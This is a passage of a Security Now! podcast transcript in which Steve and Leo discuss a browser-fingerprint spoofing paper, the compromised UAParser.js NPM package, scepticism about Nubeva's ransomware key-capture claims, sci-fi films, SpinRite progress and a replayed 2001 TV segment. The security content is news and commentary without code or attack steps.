STEVE:  Yes, exactly.  I was caught off guard by the exaggerated descriptions of this new and reportedly devastating attack.  These are the headlines in the tech press.  One of the things that heightened my expectations was that the story was widely picked up across the tech press.  So it was with some anticipation as I had acquired a whole bunch of tabs that I clicked this tab to turn my attention to see what was going on.  This might have been the title article.



LEO:  Huge.  Huge.



STEVE:  The title story of the podcast.



LEO:  Yes.



STEVE:  The paper was authored by three researchers, two from Texas A&M University and the other from the University of Florida.  And it's titled "Gummy Browsers:  Targeted Browser Spoofing Against State-of-the-Art Fingerprinting Techniques."  Its abstract reads - that's only the first half because I couldn't tolerate going any further.  The abstract reads:  "We present a simple yet potentially devastating and hard to detect threat called Gummy Browsers" - and I had to make sure this wasn't published on April 1st, but no, I mean, they're serious about this - "whereby the browser fingerprinting information can be collected and spoofed without the victim's awareness, thereby compromising the privacy and security of any application that uses browser fingerprinting."  Okay.



"The idea is that the attacker A first makes the user U connect to his website or to a well-known site the attacker controls and transparently collects the information from user U that is used for fingerprinting purposes just like any fingerprinting website W collects this information.  Then A, the attacker, orchestrates a browser on his own machine to replicate and transmit the same fingerprinting information when connecting to website W, fooling W to think that user U is the one requesting the service rather than attacker A.  As a consequence, if website W populates targeted ads for user U based only on fingerprints, attacker A can now start seeing the same or similar ads on his..."



LEO:  Ooh.



STEVE:  I know, Leo.  Oh, my god.



LEO:  He can see your ads.  Oh, no.



STEVE:  He can see and he might get the same ads you got on his browser as user U would see.  This will allow the attacker to profile user U and compromise U's privacy.



LEO:  Oh, lord.



STEVE:  I know.



LEO:  Terrifying.  Now, I'm interested because it sounds like you could also use this to fuzz your fingerprinting.  So you could use it defensively, I would imagine.



STEVE:  Well, so in other words, if a website uses advertisers who only employ browser fingerprinting rather than cookies to identify their advertising targets - which is, of course, very fuzzy identification, certainly browser fingerprints we know are not unique - then it would be possible to capture a victim's browser fingerprint by causing their browser to request an asset from an attacker-controlled web server.  Then that attacker-controlled web server could query the original website while deliberately echoing and presenting all of the features of the original browser's query which are fingerprinted by that site's advertisers.



Now, of course, that assumes that the attacker was also querying and reproducing the identical set of browser fingerprintable features, and that's unknowable.  As we know, sometimes they do weird things like illumination level or battery level, right, which is captured via JavaScript.  So the attacker doesn't know how the advertisers are fingerprinting in the first place.  So all they can do is a best guess, which probably adds some additional fuzz.



And in this way the attacker would, yes, be spoofing the website's advertisers into believing that the attacker is actually the user, which - and this is the great headline-grabbing concern of these browsers - would allow them to "profile the users."  Oh, my.  But anyway, you got it, Leo.



LEO:  Yeah.



STEVE:  You know, I originally thought that listening to the audio in a remote room by bouncing a beam of light off a vibrating bag of potato chips was of questionable value.  But this one might actually be even less useful.



LEO:  I can see your ads.



STEVE:  In the words of the authors, yes:  "We present a simple yet potentially devastating and hard to detect threat called Gummy Browsers."  Devastating?  Not so much.



But here's a baddie, and this is in all seriousness.  This is a user-agent parser NPM package was maliciously altered.  Now, what we're seeing is that one by one successive chunks of the technology the world has created for the benefit of everyone are falling to abuse by bad actors.  The trouble is security is difficult, and it's not automatic.  Attacks on the software industry's software module supply chain are extremely worrisome because that supply chain was never really secured.



And there are all manner of ways for bad guys to get their malicious code into the systems of unsuspecting end-users and packaging developers.  We've discussed a few of these various means of subversion, if you'll pardon the pun, in the past.  Like posting something malicious under the name of something real, but having a higher version number than the latest real version.  Insecure packet managers may encounter that higher-numbered malicious package, believe that they no longer have the latest and greatest, and so download the malware for incorporation into their next builds. It's a mess.  That has happened before, as we've described.



Okay.  So in that vein, we learned just last Friday that a massively popular browser user-agent header parser named UAParser.js, which is packaged as a JavaScript NPM and is routinely downloaded - get this, Leo - six to seven million times per week.



LEO:  Wow.



STEVE:  Yes, on average a million downloads a day.  It was compromised.  Of course naturally you'd want to target something that was that popular.  It was compromised and, yes, then massively downloaded.  I mean, and this is enough for CISA to make an announcement.  We'll talk about that in a second.  The compromise installs a password stealer, a cryptocurrency miner, and worse on systems where the compromised versions were used.  According to the official UAParser.js official site, the library is used by companies such as - we've heard of them - Facebook, Apple, Amazon, Microsoft, Slack, IBM, HPE, Dell, Oracle, Mozilla, Shopify, Reddit, and many of Silicon Valley's elites.  The compromised versions were 0.7.29, 0.8.0, and 1.0.0.  So obviously he's maintaining three major version threads.  The patched versions are 7.30 rather than 29, 8.1 rather than 8.0, and 1.0.1 rather than 1.0.0.



The library's author, Faisal Salman, wrote:  "I believe someone was hijacking my NPM account and published some compromised packages which will probably install malware."  Yeah.  Probably, indeed.  A few hours later, after discovering the hack, Salman pulled the compromised library versions to prevent users from accidentally infecting themselves, and he replaced them with clean copies, updating their version numbers.



Subsequent analysis of the malicious code revealed extra scripts that would download and execute binaries from a remote server.  The binaries were provided for both Linux and Windows platforms.  On Friday, a GitHub user said:  "From the command-line arguments, one of them looks like a cryptominer, but that might just be camouflage."



But on Windows systems, the scripts also download and execute an info stealer trojan, which might be a version of the DanaBot malware.  According to another GitHub user's findings, it contains the capabilities to export browser cookies, thus allowing for browser session logon hijacking; also exports browser passwords and OS credentials.  Because of the large number of downloads and the big-name corporations that relied on the library, the U.S. Cybersecurity and Infrastructure Security Agency (CISA), also the worst named agency there is, published a security alert late Friday night about the incident, urging developers to update to the safe versions.  They just wanted to make sure the word got out.



GitHub's security team also took note of the incident and issued its own advisory, urging immediate password resets and token rotations from systems where the library was used as part of development processes.  They wrote:  "Any computer that has this package installed or running should be considered fully compromised.  All secrets and keys stored on that computer should be rotated immediately from a different computer.  The package should be removed.  But as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it."  And as we once said, oh, my god, Leo, at the dawn of this podcast, once a computer has been compromised, you never can really trust it again.  You just have to restore from a pre-compromised backup and then move forward.



And just for the record, this was the fourth malicious NPM package found this week.  On Wednesday, Sonatype also found three newly released NPM libraries that contained similar malicious code, intended to download and install a cryptocurrency miner targeting Linux and Windows systems alike.  So it may very well have been the same attack going against a different package.  So, yes.  Houston, we have a problem.  As I said, we built so much of our world under the assumption that sharing and collaboration would make us all stronger.  Without any doubt, it does.  But it also inherently opens us to infiltration by those wishing to take advantage of the trust that's inherent in online collaborative efforts.  So these are problems we have, as we'll see in a little bit.  We apparently still had the same problems 20 years ago.  Let's please hope that 20 years from now, from our rocking chairs, Leo, you and I will note, well, they finally got that fixed.



LEO:  I am almost certain that will not be the case.  These package managers are inherently problematic because people contribute to them.  There's not a lot of checking.  And so really the burden is on the user to inspect the script and make sure that they understand what the script does and so forth.  But these are all over the place.  NPMs are very, very popular; but Python has its own system.  Linux itself has systems like this.  I use a version of Linux called Arch that has an Arch User Repository, and anybody can put anything there.  And of course people also download stuff from GitHub all the time.  So there's a lot of vulnerability out there.



STEVE:  The best you can do, I think, is if you're going to be using these, then stay current.  Be absolutely sure that you're in the loop to receive notifications because basically that's the price you pay for the otherwise, well, look what I can get for free.



LEO:  Right.



STEVE:  It's like, yeah, but it might bite you in the butt.  So if you're going to get it for free, make sure you also get the communications that follow because it may save you.



I found a really interesting post for our Closing the Loop.  Tom Andreas, looks like Mannerud, or Mannerud maybe.  Anyway, he said:  "Steve, have you heard of Nubeva before?  I just came across them recently and was fascinated by their technology.  Seems they are turning the ransomware game on its head.  Their technology intercepts and stores the encryption keys used by ransomware so that you can restore your files without needing to pay ransom or restore from backup."  He included a link.  And he said:  "I would be curious to hear what you think."  And oh, boy, Tom, are you going to hear.



Okay.  So I was interested, and I went looking to see what was up:  www.nubeva.com.  Nubeva's claim to fame appears to be what they call "TLS Decryption Evolved."  Okay, TLS Decryption Evolved.  Think about that for a minute.  That's not supposed to be possible.  The banner on their homepage says:  "Nubeva's patented" - because of course it is - "SKI" - fortunately we're not left to wonder what that stands for - "(Session Key Intercept) software technology delivers a breakthrough solution for modern TLS decryption.  SKI decrypts any TLS, with trailblazing price performance and ease of use."  Because, you know, if you're going to decrypt TLS, might as well do it in a trailblazing fashion and make it affordable.  "Nubeva licenses SKI" - that's the Session Key Intercept - "to fill growing capability gaps in legacy decryption and simplify operations for inline and passive cybersecurity and application monitoring solutions."



Okay.  So this claim raises all manner of questions because the entire point of TLS is explicitly to prevent any third party from being able to obtain the communication's session keys.  Digging a bit deeper, under their homepage headline, we find "See Into Any Session."  And they explain:  "To inspect TLS, each session's shared encryption keys are needed to decrypt."  True.  "With SKI (Session Key Intercept), Nubeva delivers a reliable, secure, scalable, and nondisruptive means to learn and extract session secrets from servers or clients at the time of creation via the handshake, and transport for use on authorized decryption functions.  After use, keys are destroyed, thus ensuring the highest levels of secrecy.  Nubeva licenses software to get keys, securely handle keys, and use keys to decrypt."  Ah, okay.



So now it becomes clear.  They said:  "...means to learn and extract session secrets from servers or clients at the time of creation via the handshake...."  So this patented Nubeva technology is not a man in the middle, it's a man deeply embedded into one of the endpoints.  From that vantage point it watches the TLS handshake and captures the symmetric encryption key once it's been determined.



Under product details they say:  "Supporting a growing list of platforms and OS including containers, Kubernetes DaemonSet, Windows service, or Native Linux Daemon."  Okay.  So it's not a universal solution, either.  For example, under Windows, they've reverse engineered Windows crypto library, where TLS is always negotiated, that is, unless a pesky third party like Firefox brought along its own crypto library.  But in any event, they've built, apparently, a set of hooks into Windows' crypto library so that they can snapshot its working memory to identify and capture any negotiated keys on the fly.  And they've done something similar for Linux and Kubernetes with "a growing list of platforms."



Okay, I suppose that's useful, though it's not entirely clear exactly how, since the interception, such as it is, occurs at an endpoint where you also inherently have the pre-encrypted and post-decrypted plaintext directly available.  It seems like the hard way to skin that particular cat.  And this has nothing to do with ransomware, but it gives us a starting point for understanding their next set of claims, which is on the link that Tom provided under "ransomless_decryption."



On that page they say:  "Nubeva for Ransomware  Universal RansomLess Decryption."  Sounds great.  Where do I get some of that?  And then they continue:  "The RansomLess Decryption is a product development effort by Nubeva to build a revolutionary and systemic solution to this worldwide threat.  Not another defense system.  Not another backup system.  Nubeva enables the reversal of ransomware's encryption with RansomLESS decryption" - and LESS is in all caps - "and recovery.  Our solution is an adaptation of our patented" - that's right.  Oh, get a patent on that - "Session Key Intercept technology, in which Nubeva has perfected the ability to reliably learn and extract the symmetric keys used in ransomware to encrypt files."



Okay, wait.  They've "perfected the ability to reliably learn and extract the symmetric keys used in ransomware to encrypt files."  Hmm.  Okay.  "We can reliably get keys copies of the keys" - a little typo there - "right at the moment of encryption, before they are locked with the asymmetric encryption process or exported to command-and-control servers.  And with the file encryption keys available, decryption is simple and immediate.  And we can do this not just for old and extinct ransomware variations like many tools on the Internet, we can get keys for all modern and historic crypto ransomware, thus delivering a universal solution."  Boy, if only that were true.



LEO:  Oh, it's not?



STEVE:  Well, okay.  "When the attackers get through defenses, there is no need for lengthy recovery processes from backups provided you have them, they are current, and weren't turned off or corrupted by the ransomware, too.  Instead, simply decrypt and restore without paying, with Nubeva's RansomLess decryption and recovery."  Wow.



LEO:  I like their name, Nubeva, too.  That's so good.



STEVE:  I know, Leo.  And there's something I could say that was off-color.  I'm so...



LEO:  Oh, no, please.



STEVE:  But I skipped it.  Anyway, their page then shows us three videos in a horizontal grid or alignment, one for REvil, one for Araran - I don't know, I've never heard of it - AraranLocker/Venus, and one for another one I've never heard of, Zariza.  In each case, you click the video, they have their solution installed in the system when the ransomware is triggered.  And sure enough, their system captures the encryption keys at the time of encryption.



LEO:  Yeah?  I do recognize Sodinokibi.  That's the big one, of course.



STEVE:  Yeah, of course, right. 



LEO:  That's REvil, yeah.



STEVE:  Yeah, REvil.  So the end of this page then declares, again:  "Not another defense system.  Not more storage or system backup services.  Decrypt without paying."  Well, of course you have to pay them, and remember it's patented.  "You already have the keys," they say.  And then literally they have "We get the keys!"



LEO:  We do.



STEVE:  "Nubeva's core intellectual property, Session Key Intercept, is software that can reliably, efficiently, and securely discover symmetric encryption keys of application processes and services running on computer systems that are used for bulk symmetric encryption.  We have mastered this ability for TLS session keys to enable better, faster, and easier full packet inspection and protection of network traffic.  We have proven we can do this for SMBv3 file-sharing traffic.  Now Nubeva has successfully applied this IP to ransomware and is working to bring it to market in partnership with the selected leaders in security solutions, business, and government."



Okay.  What I believe that they have actually shown is that with a specifically constrained environment such as TLS or SMBv3, on specific platforms for which they are designed, they are able to capture the symmetric keys of those processes that they know.  So this leaves us with two big questions.  First, how generic can this really be?  It would be entirely possible to reverse engineer a specific piece of ransomware for the purpose of building an interceptor for that specific ransomware, much as they did for TLS and SMB.  Then, assuming that this Nubeva agent was already running in a system which was subsequently the victim of exactly that same ransomware which Nubeva had been previously trained to observe and intercept, then yeah.  It would be just like those videos.



So the question is, as I said, how generic can it be?  I think that's to be determined and proven, and that's where I'm exceedingly skeptical.  They're claiming that this is an extension of their existing proven and, oh, yes, very deeply patented technology.  But calling it an extension, I think, stretches the meaning of the term, probably past the point of breaking.



The second big question is, if you have a software agent that's running in a machine which is already paying attention to what's going on and is able to see that some ransomware running in a given process has just generated a symmetric encryption key in preparation for encrypting a file, why not just immediately terminate that process...



LEO:  Yeah.  What a good idea.



STEVE:  ...with extreme prejudice, send an emergency note to corporate IT headquarters, and shut down the machine?



LEO:  Oh, yeah.  Look to see what the key is.



STEVE:  Why would you patiently sit there watching the ransomware go about its dastardly business, frantically recording all of the keys it's using to encrypt, and letting it do so?  And where are all those keys going to be stored, anyway?  Hopefully they don't get encrypted.  Anyway, thank you, Tom, for pointing us to what really seems like a harebrained idea.  It's unclear, even in the case of TLS or SMBv3 interception, what problem is being solved by implanting an agent into an endpoint to capture the negotiated key for the purpose of decryption when that endpoint also contains the plaintext?  Why not just get the plaintext?



And it's not at all clear that this technology can really be extended beyond that somewhat questionable application and made into a generic symmetric key capture utility.  When we had Heartbleed, which was capturing snapshots of RAM and, sure enough, was able to discover live server certificates in that RAM, it was able to do so only because it was finding certificates.  A certificate is a rigid and fully specified highly structured block of data.  So it can readily be discovered, with a near zero false positive rate, simply by scanning through RAM, looking for specific attributes that a certificate will have, then seeing if more of them are present where they should be relative to the ones you saw and confirming that, hey, look, we actually found a certificate.



But a symmetric key has no structure.  As we know, it's just a block of 32 bytes, in the case of a 256-bit symmetric key, of maximum entropy random binary data that, from the perspective of an outside observer, could be anything.  It's only if you know precisely where it is that you could know what it is.  Unlike a certificate, nothing identifies it as being a symmetric key.  That's why the only way I can see this working is with a highly customized and targeted agent.  So color me skeptical about the ability for this to be made into a generic ransomware solution.  But thank you, Tom, for a fun little exercise.  Leo?



LEO:  Yes.



STEVE:  Completely off topic.



LEO:  Yes.



STEVE:  I wanted to take a moment to comment upon a new and annoying behavior that I've been encountering on more and more websites and to ask whether you might have been seeing it, too.  I'm on a site, typically from following a link from a search engine.  I look around and don't see what I was looking for.  So as I slide my mouse off the page, toward the browser's Back button, or maybe toward the page's tab in order to close it, the browser's JavaScript, which it turns out has been silently, until now, monitoring my mouse's movements, intercepts my attempt to leave, darkens the screen, and pops up a "before you leave" or "are you sure you want to leave" intercept.  It's happening, I'm noticing it more and more.  It's a little bit jarring, and it's really annoying.



LEO:  Totally annoying, yeah.



STEVE:  So if it keeps up I wouldn't be surprised to see browsers start blocking this behavior, or an add-on created to do so.  So you have had that happen to you?



LEO:  Oh, yeah, of course.  The other one that bugs the heck out of me, when you're sitting on a page, happens all the time, and you're reading something, and the big thing slides down and says "Subscribe to our newsletter" or some such prose.  And you have to click it away.  And often, this one I really like, they hide the click-away X for a while.  So you're looking, and you're looking, and you go, I have to read this.  I don't see the close.  How do I get out of it?  And then it shows up slowly.  Very annoying.  People, these are dark patterns, and I hate seeing these things happen.



STEVE:  Well, and yes, it's either when you've been there for a while or you've scrolled down to a certain distance.



LEO:  Right.  That's right.



STEVE:  And they go, ah.  We've got them hooked.



LEO:  Surely you'd want this, yeah.



STEVE:  Okay.  So you and I, I already know because I've heard you talk about it several times now, feel the same way about "Dune."



LEO:  Oh, good.  Can't wait to talk about this with you.



STEVE:  A masterpiece.



LEO:  Isn't it?  Isn't it?



STEVE:  Yeah.



LEO:  Yeah.  I'm so glad to hear you say that.  I wasn't sure if it was just me.



STEVE:  Lorrie was as frustrated as Alex and you and I that - and I really wanted to turn on subtitles, and especially because "Dune" happens to have a lot of, like, deliberate whispering.  It's not just like, I mean, like whispering is what they're actually doing; right?



LEO:  Yeah, yeah.



STEVE:  And but it's unintelligible.  It's like, what?  What?  



LEO:  Huh?  Huh?  Huh?



STEVE:  And I just got tired of it.  I'd assumed, first of all, I know I'm going to see it again because now we have to wait two years for the second half of this.  But boy, for anyone who has not seen it, first of all, know that it's only the first half of the story.  It stops, like at a good point, frankly, because they got a lot of that stuff done.  We're sort of at a neat stopping point.  But it only is the first half.  But it is a good two and a half hours of real fun.



LEO:  Yeah.  Yeah.  I mean, it's not all the book.  Couldn't be.  But the stuff they put in is great.  I really enjoyed it, yeah.



STEVE:  Yeah, yeah.  I just think - and I just - I loved as a point of sci-fi how arrogantly casual they are with the manipulation of gravity.



LEO:  I know.  That's the one advanced technology they have, is the suspensors.



STEVE:  Yeah, okay.  Good point.



LEO:  But it was that way in the book, too.



STEVE:  And good point.  Why is it in the year 10191 that you choose swords?  Come on, really?  We know they have advanced beam technology because, and this doesn't give anything away for me to say that a beam was used at some point, and it's a nasty-ass beam, to cut through a door.  So they've got that.  But they're not using any...



LEO:  And that is a good beam, isn't it.  I never thought about that.  That thing, hoo.



STEVE:  Oh, boy, that's a good...



LEO:  They should have just shot that right through Gurney Halleck, and it would have been a lot easier.



STEVE:  Exactly.  Why aren't they shooting those at each other?  No, we want swords.



LEO:  It's better for the movie.



STEVE:  It's going to, yeah, make for some better battles, I don't know.  Anyway.



LEO:  I guess.  It's pretty funny they didn't think of that.



STEVE:  I did want to note that I've not seen any more "Foundation."  I'm going to make myself watch it just because, you know, sci-fi.  But boy, you put them side by side, and there's just no comparison.



LEO:  And we did, and it was like watching an old "Star Trek."  And I didn't really think that at first with "Foundation."  But when you see it done so beautifully, you know, then it really comes home.



STEVE:  Yeah.  "Dune" is a visual masterpiece.  And by the way, its director is the same guy who did "Arrival."  And I just wanted to make sure...



LEO:  Yes, he's very good.  I like him.



STEVE:  Yeah, I wanted to make sure everyone knows about "Arrival."  It's Lorrie's favorite science fiction movie of all time.  We watched it twice because it's just, you know, it's got an amazing, really unbelievably cool concept as like the best sci-fi does, you know, it's there for a reason.  There's a concept which, I mean, and you've got to really think about it, actually.  It's not all just given to you on a plate.  But when you get it it's like, oh, that is the coolest thing.



LEO:  Yeah.  I really liked "Arrival," yeah.



STEVE:  And we are three episodes into "Invasion."  You've not seen it, Leo.



LEO:  No.



STEVE:  You were thinking maybe of downloading it and taking it with you.



LEO:  Yeah.



STEVE:  And I would say only if you need to sleep, or you want your trip to seem a lot longer.  This also doesn't give anything away.



LEO:  That's so disappointing.  The trailer was good.  It looked like it might be a great - I love that popular subject in sci-fi of aliens arriving.



STEVE:  Yeah, yeah.  And I was thinking, okay, "Foundation," no.  "Invasion," maybe, hopefully.  No.



LEO:  No.



STEVE:  And what they're trying to do is tell the story from multiple threads of different plotlines of people who are affected by this.



LEO:  Right.



STEVE:  But they're going way too far.  I mean, I don't care if her shoes no longer fit because she's growing too quickly.  It's like, oh, get on with it already.  You know?  And, wow, they're not afraid to kill off people.  That's good.  So that, like, threads get ended.  But some of them it's like, I'm really sorry that your lover died, but gee.  We don't really care about you now, do we?  It's, wow.  So, yeah, don't - it's not worth a subscription.  Maybe it's going to, like, when is it going to pick up?  I don't know.  It's painful.  I mean, really, episode three was more of episode two.  Anyway, I've said enough.



I did want to mention I'm heading toward the fifth pre-release of SpinRite to the GRC spinrite.dev newsgroup.  I found and fixed the problem I mentioned last week which only affected Intel chipsets, and then only when they were operating in their legacy IDE/ATA mode rather than in their modern AHCI mode.  But there was another related problem hiding behind that first one which I'm currently pursuing.  Since the bug is intimately tied to specific hardware which I only have here at my primary workplace, in the evenings when I'm not here I've been at work on the improvement to SpinRite's benchmarking, which will soon boast a new and really cool feature.  So all's going well.



LEO:  Mr. Gibson.



STEVE:  Okay.  So the inspiration for this week's title began with a tweet I received in the late morning on Sunday, two days ago, from Eric, who tweeted publicly from @ELHonline.  Eric wrote:  "As a longtime listener of @SGgrc's Security Now! podcast, I was delighted to stumble across this gem from 20 years ago!  It's so funny how much technology has advanced, and yet so many problems remain the same."



Now, on the one hand, it's easy to say, "Yeah, there are still security problems."  But I hadn't watched that video, which I've also had posted on GRC since the beginning, for many years.  Eric's tweet got me to spend five and a half minutes watching it again.  And when I did, I was frankly astonished to listen to my conversation with you, Leo, which took place on Monday, April 9th, 2001, and hear just exactly the degree to which we are still right where we were then.



So I want to play this short audio and video into the podcast, to share with our listeners.  Then let's spend a bit of time chatting about the degree to which "the more things change."  And the first three minutes in particular, but the other two and a half are fun, too.



LEO:  All right.  Here you go.  Let's go back in time.  Set the time machine for the year 2001, and a little show we liked to call "The Screen Savers."



["The Screen Savers," April 9th, 2001]



LEO:  Oh, hi.  Could you - welcome back.  Could you develop an anti-hacking device for the FBI?  Could you do it in two days?  That's what Steve Gibson of Gibson Research Corporation did, and he's here to tell us all about it.  Welcome, Steve.  It's good to have you back.



STEVE:  Hey, Leo.  Great to be back.



LEO:  Man, we were just talking about your columns in InfoWorld, which I read religious - it was InfoWorld; right?



STEVE:  InfoWorld for eight years, every week.



LEO:  Loved them.  Read them religiously.  And of course you wrote SpinRite, which is still the definitive disk recovery and file recovery program.



STEVE:  It's what pays the bills for all the other stuff I'm doing.



LEO:  You still sell it.



STEVE:  Yeah.



LEO:  Yeah.  Well, that's the neat thing.  You also give away a lot of stuff.  And I think a lot of people know about ShieldsUP!.



STEVE:  Right.



LEO:  Which is firewall testing software.



STEVE:  Right.



LEO:  I know you've got LeakTest, which goes another step further.



STEVE:  Right.



LEO:  And you've done so many great things.  Let's talk about PatchWork.



STEVE:  Right.



LEO:  What is PatchWork?



STEVE:  PatchWork is a tool designed to quickly tell an NT or Windows 2000 ecommerce site user whether they've applied all the patches they need to in order to keep their systems safe against these Russian hackers.  About, what, about a month ago, I guess, the FBI released the news that 40 domestic ecommerce sites had been hacked who were using Windows NT or 2000; that credit card information was stolen by these guys operating out of Eastern Europe, in the Ukraine, I guess.  And then after getting the data, they extorted the companies, offering them their Internet security services, you know, saying, well, if you use our services, then these credit cards aren't going to escape.



LEO:  It's a classic protection racket.



STEVE:  Oh, exactly.  It was pure extortion.  So...



LEO:  Now, how did you get involved in this?



STEVE:  Briefly before the news came out I was contacted by the FBI and the SANS Institute because they wanted to have something that would allow people sort of to go along with this announcement...



LEO:  Now, how do they know you, though?  I mean, how did they say Steve Gibson?



STEVE:  Just from GRC.com and ShieldsUP! and all that stuff.



LEO:  Really, that's great.  That's real great.



STEVE:  You know, the work I've been doing.  So I, like in two days, as you said, I very quickly produced a new little piece of free software called PatchWork to - and you just run it.  It's like 25K.  It's written in assembler, like all my stuff.



LEO:  Now, it's for people who are running the Internet Information Server, the web server in Windows NT?  Is that right?



STEVE:  Right.  It's only for NT4 or Windows 2000, and really only useful if you're on the 'Net.  



LEO:  And running a ecommerce site on the 'Net.



STEVE:  Well, if you have - even a web server.  If you've got any data which is in that server, which is on the 'Net, there are four known vulnerabilities.  And what was so screwy about this is the Russian hackers were using exploits that have been known for years.  Microsoft has patches on their site.  And yet...



LEO:  Wait a minute.  These holes have been known for years.  The patches have been out for years.  But people are running ecommerce sites and not taking the most rudimentary precautions of downloading the latest versions?



STEVE:  Well, and that's, you know, it's really their fault.  Microsoft in fact, one of these was so bad, Microsoft re-released the patch a year later, like, you know, to remind people that this thing was a problem, a known problem with Windows.



LEO:  This is for corporate users.  If you're an individual, this might be of more interest to you.  This is the latest.  This kind of, it's the next generation of ShieldsUP!, I kind of liken it to.



STEVE:  Well, the way I think of it is ShieldsUP! tests your security from the outside in, to make sure nobody outside can get in.  LeakTest checks your security from the inside out to make sure that your firewall is actually protecting you from internal extrusion of your data, to make sure that it's not leaking out.



LEO:  So ShieldsUP! says I can't see anything about your system coming from the outside.



STEVE:  Right.



LEO:  LeakTest is making sure that, if a trojan horse or something were sitting on your system, it couldn't actually - I'm going to run this program right now.  It couldn't actually - it's not signatured, but I trust you, Steve.  Should I?



STEVE:  Well, yeah, you can.  And in fact I specifically signed PatchWork...



LEO:  Nothing's happened yet, 20 minutes later.



STEVE:  ...because I knew it was going to be downloaded from another site, not from mine.  So I wanted to sign it to make sure people knew it hadn't been...



LEO:  We'd better fix our firewall.  Actually we're not running a firewall, and that's why I'm getting that error message.



STEVE:  It's just that simple to test.



LEO:  And one of the things that's great about this is based on this test, a number of firewall companies have changed their capabilities to respond to your...



STEVE:  The reason I released it is that every single firewall except one had the problem that this thing was checking for.  ZoneAlarm was the only one that was not leaking.  Norton's, McAfee's, Sygate...



LEO:  How many of them are fixed now?



STEVE:  All of them.



LEO:  Oh, keep up the good work.



STEVE:  Well, I have Version 2 on the way.  So...



LEO:  The one last thing we're going to see, we're running out of time, Netfilter.  Real quickly, what does this do?



STEVE:  NetFilter is my next-generation solution both for internal and external information theft and spying.



LEO:  This is going to run at the network level and watch for all sorts of nefarious privacy invasions.



STEVE:  Exactly.  It doesn't replace a firewall.  It's compatible with them.



LEO:  When will this be out?  How soon will this be out?



STEVE:  Oh, lord only knows.



LEO:  Well, if we sent you home soon, could you get to work?



STEVE:  A couple months, probably.



LEO:  Really.  Okay.  You do all your stuff, and I have to say this is really great, in assembler.  It's tiny, 40, 50K.  Even SpinRite, which is a massive program, 40 or 50K.  It's a tiny download.



STEVE:  It used to be a COM. It was a less than 64K COM program in the DOS phase.  Now it's a little bit bigger.



LEO:  When are you going to move to C and join us in the real world?



STEVE:  Well, I've got some more things I have to do first.



LEO:  All right.  Steve, you're the greatest.  Thank you for the good work you've done.  When NetFilter comes out, we'll tell the world to get it.  Meanwhile, go to GRC.com.  Use ShieldsUP! and LeakTest.  Make sure you're safe online.  And I'm sure the FBI gave you a - did they give you a medal?  Anything?



STEVE:  No, I just did it because it was important.



LEO:  They just thanked you.  That's great.  Steve, we appreciate it.  Good luck.  Always good to meet you.



[Back to 2021]



LEO:  That's nice.  That's nice.  Few years ago.  I think it's, by the way, a little sped up.  I just want to say I don't think you and I talk that fast or that high.  So I think it's a little sped up.  But other than that...



STEVE:  That's interesting because Lorrie commented that my voice had changed.



LEO:  Yeah, it hasn't.



STEVE:  And I was thinking, really?



LEO:  It's a couple of frames faster than normal.  For some reason a lot of - maybe it's VHS tapes or something.  But a lot of the stuff on YouTube of "The Screen Savers" sounds like that.



STEVE:  Anyway, like Russians penetrating...



LEO:  All the same.  It's all the same.



STEVE:  ...through Windows, extorting companies, extracting their information and holding their data at ransom, patches issued years before that have still not been applied, which if they were applied there wouldn't be a problem.  I mean, it was just like, wow, 20 years ago, there we were, with hair.  



LEO:  Yeah.



STEVE:  You still have yours.  But...



LEO:  Monitors have also - both monitors and I have gotten thinner.  But other than that.  You look great.  It's funny how things have changed, and yet they stay the same, yeah. 



STEVE:  Yeah.  Yeah.  Got a kick out of that.



LEO:  Is LeakTest - you can still download it.



STEVE:  Oh, yeah.  But it's of - I don't even know...



LEO:  Historic interest.



STEVE:  I don't even know if it's still - if I have an endpoint that receives the data from it.



LEO:  Oh, okay.



STEVE:  Not sure, yeah.  And PatchWork was a little quickie that the SANS Institute was distributing.  They asked me to do it and if they could distribute it.  And I said yeah, sure.



LEO:  Nice.



STEVE:  And then NetFilter never happened because the more I thought about it, it was the encryption that was a problem, TLS.  I wouldn't be able - I was going to do packet-level inspection, but it would have been a real pain to get in there and deal with encryption, which was just beginning to happen.  And when I was talking about NT and 2000, that was in April.  And as we just noted, that year in, like, yesterday, October 25th was when XP was released.  So XP didn't exist at that point.



LEO:  Wow.



STEVE:  It was just NT and 2000.  And on the consumer side Windows 98.



LEO:  We were still in 98 Land.



STEVE:  Or I guess Millennium; right?  I think that was the last.



LEO:  Oh, maybe.  I forgot about Millennium, yeah.  Wow.  Wow.



STEVE:  Anyway, I thought our listeners would get a kick out of just listening to, yes, that could have been said today, and it would still have sounded completely current.



LEO:  Yeah.  No changes.



STEVE:  Which is - it's a sort of a sad statement.



LEO:  I guess.  You still write in assembler code.  That's a good thing.



STEVE:  Still writing in assembler code.



LEO:  Still working hard to get new stuff out.



STEVE:  Still selling SpinRite.



LEO:  Yup.



STEVE:  Still working on SpinRite.  That's still the bread and butter.



LEO:  Yeah.



STEVE:  And giving a lot of stuff away for free.



LEO:  Those were the days, before Nubeva.



STEVE:  Nubeva.  Well, I wouldn't hold out any hope.  Yeah.



LEO:  Oh, Steve.  I tell you, always a pleasure.  I love doing this show.  I will not be here next week, as you know.  Jason will be filling in.  I'm going to be in Mexico.  I'll be back in two weeks.  But I'm sure the crooks will still be around, and we'll still have plenty to talk about.



STEVE:  I have a feeling, yeah.



LEO:  We do Security Now! every Tuesday around 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  It'll be 21:30 UTC after November 7th.  So in a couple of weeks we go to standard time.



STEVE:  Yay, finally.



LEO:  Finally.  You know, when they shifted it, the candy makers of America petitioned Congress to not change to standard time until after Halloween. 



STEVE:  Oh, my.



LEO:  Because they wanted to maximize, I don't know, trick-or-treating time, I guess?  They were concerned about economic impact.



STEVE:  That, children, is the way government functions.



LEO:  It's the story of America, my friends.  Oh, my goodness.  If you want to watch us do it live you can tune in at that time, TWiT.tv/live. There's live audio and video streams there.  If you're watching live, you should chat live.  There's a great bunch of chatters in two different places.  The wide-open chat available to all is irc.twit.tv.  You don't even need an IRC client.  You can just use the website for that.  But it's nice if you have one, if you plan to come back.



